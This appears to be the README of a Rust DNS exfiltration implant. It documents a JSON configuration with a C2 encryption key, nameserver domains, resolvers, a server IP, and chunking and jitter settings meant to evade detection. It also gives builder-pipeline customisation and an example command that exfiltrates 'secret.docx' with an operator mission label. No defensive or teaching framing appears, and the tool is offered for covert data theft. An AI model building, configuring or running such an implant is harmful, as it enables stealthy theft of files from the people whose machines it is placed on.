# Exfil Client

Rust implementation of the standalone DNS exfiltration implant described in `agent_docs/exfil_client_design.md`.

## Configuration

The binary ships with embedded defaults defined in `src/config.rs`. To avoid editing source during build time, provide a JSON config via one of the following:

1. `EXFIL_CONFIG_PATH=/path/to/config.json`
2. `EXFIL_CONFIG_JSON='{"encryption_key":"..."}'`

The JSON schema matches:

```json
{
  "encryption_key": "MySecretC2Key123!@#DefaultChange",
  "domains": ["ns1.example.com", "ns2.example.com"],
  "resolvers": ["1.1.1.1:53", "8.8.8.8:53"],
  "server_ip": "98.90.218.70",
  "chunk_bytes": 180,
  "jitter_min_ms": 1500,
  "jitter_max_ms": 4000,
  "chunks_per_burst": 5,
  "burst_pause_ms": 12000
}
```

Builder pipelines can drop the generated JSON beside the binary and launch it with `EXFIL_CONFIG_PATH` for per-build customization.

## Usage

```
./exfil-client --file secret.docx --note "mission-99"
```

Flags:
- `--file <path>`: file to exfiltrate (omit to read stdin)
- `--note <string>`: operator label stored with metadata
- `--session <hex>`: resume an in-progress transfer (prints the suggested value on failure)

## Development

```
cargo fmt
cargo clippy
cargo test
```

The `cargo test` suite exercises the base36 codec and AES-GCM pipeline to guard regressions in the encoding/transport path.
